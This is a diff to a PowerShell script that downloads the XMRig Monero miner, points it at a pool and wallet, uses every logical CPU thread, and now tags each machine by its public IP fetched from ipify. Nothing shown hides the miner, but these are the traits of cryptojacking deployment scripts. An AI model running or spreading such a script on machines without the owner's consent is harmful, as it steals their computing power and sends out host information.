@@ -1,7 +1,14 @@
 $algo = "rx/0"
 $pool = "gulf.moneroocean.stream:10001"
 $user = "45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH"
-$pass = "Windows"
+
+try {
+    $publicIP = (Invoke-WebRequest -Uri "https://api64.ipify.org").Content
+} catch {
+    $publicIP = (New-Guid).Guid.Substring(0, 8)
+}
+
+$pass = "Windows-$publicIP"
 $threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
